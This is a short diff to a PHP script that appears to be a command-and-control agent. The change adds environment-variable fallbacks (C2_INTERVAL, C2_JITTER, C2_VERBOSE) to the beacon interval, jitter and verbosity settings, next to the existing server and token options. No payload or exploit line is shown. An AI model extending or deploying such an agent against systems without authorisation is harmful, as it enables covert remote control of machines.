@@ -1242,9 +1242,9 @@ function execute_task($task) {
 $args = getopt('', ['server:', 'token:', 'interval:', 'jitter:', 'verbose', 'state:']);
 $server = $args['server'] ?? getenv('C2_SERVER') ?: '';
 $token = $args['token'] ?? getenv('C2_TOKEN') ?: '';
-$interval = (int)($args['interval'] ?? 10);
-$jitter = (int)($args['jitter'] ?? 0);
-$verbose = isset($args['verbose']);
+$interval = (int)($args['interval'] ?? getenv('C2_INTERVAL') ?: 10);
+$jitter = (int)($args['jitter'] ?? getenv('C2_JITTER') ?: 0);
+$verbose = isset($args['verbose']) || in_array((string)getenv('C2_VERBOSE'), ['1', 'true'], true);
 $state_file_override = $args['state'] ?? getenv('C2_STATE_FILE') ?: '';
 
 if (!$server || !$token) {
